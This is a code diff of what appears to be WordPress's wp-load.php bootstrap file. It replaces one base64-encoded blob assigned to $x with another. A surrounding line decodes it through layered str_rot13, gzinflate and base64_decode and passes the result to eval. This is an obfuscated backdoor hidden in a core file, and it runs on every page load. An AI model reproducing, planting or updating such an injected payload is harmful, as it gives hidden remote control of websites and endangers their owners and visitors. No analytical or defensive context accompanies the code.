@@ -35,7 +35,7 @@ if ( function_exists( 'error_reporting' ) ) {
 	 */
 	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
 }
-$x = "Wsi5YaNAAADQX4miFF5EYGFT0RZrzXbDBDDGWROBl+H0wGPYwNdU2+0r31Tz9vvtPWoTjaqoDq76dc3BxvsGQs9F5iAAvp7Icu3LPTy5ZaLYdE7Z5xqAfnvbC2cizHMLaqZmUwZRMbVnJ/x4hhowDys8KYnX8Wg+idDgSMAzvNwmlkpz9DJGT1tCElQs36GzHuFlTdWv65b3It4sTpyuNNXCUZ/dcDO6V7H6c1layXNfnMhmZkh0ruFHiC5zHJBe7pbK4gLECVu0Ibc0602/Ibup1kcTBxYtsyczG/UPV2xSlMTJkpCYtraV4fM0qS+fI72aTdg3DgRqLzYe7tFSpuDVyByNRbOrjwZfNjEXMG3kgJqmzaN9gDX6cJ+IzyuSRvS+yMrQKIVZs/bZkz3AbjOWJry5OYRG6W6RnSwE0QzGKZLsLXFZFnjvn1BS1h0u8u88KzhuNz2e6biSb/jvOoIHTPymUJ/RbvfR/Prn8wc=";
+$x = "rZLNd8MwEIRfUhEm2DS2dY5oWM99CiMZ/VGpFXZ6L7VY370rN9BDyK03dga+mV3p+bWf+9HJdURWFqTFN9TOlBX7LAb2wrg4BS2892+26yLUAuodGhdadyA54fs6pBWlQBkXl8CImrc4smU34gIdnNFLRhZQxfZ7tlDTJdT5V/j1421hvwoZSWvMdkTJEac6bkvU1EM13mHmMZuTwwRKMVxvlnN4e/MkhA6+mdDO7uIMdaJLkLaJdyVUosYgg8jD1ac8nUsDSOasbj/JepHG6d9jx61dHnTbwQS2uxJ1E+RHW9wdnxzyz9lHPVXaD275WtcD4/6BSu3oNU0oi/OBemSkxFKZrBBguAs4/gUMBMh9fgH5VmF+T/sN";
 eval(str_rot13(gzinflate(str_rot13(base64_decode($x)))));
 /*
  * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
